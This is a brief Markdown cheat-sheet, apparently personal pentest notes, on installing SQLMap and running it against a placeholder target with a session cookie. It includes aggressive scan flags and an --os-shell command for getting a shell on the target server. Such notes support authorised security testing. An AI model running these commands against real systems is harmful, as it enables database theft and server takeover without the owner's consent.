## SQLMap

**Install:**
* `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
* Update `~/.bash_aliases` with the following entry: `alias sqlmap="python3 /home/azureuser/src/sqlmap-dev/sqlmap.py"`

**Usage:**s
* `sqlmap -u '${T}/path?search=the+query' --cookie="PHPSESSID=${cookie}"` - cookie is needed for authentication
* `sqlmap -r ${req_file} --risk=3 --level=3 --batch --force-ssl` 
* To grab a shell: `sqlmap -u '${T}/path?search=the+query' --cookie="PHPSESSID=${cookie}" --os-shell`
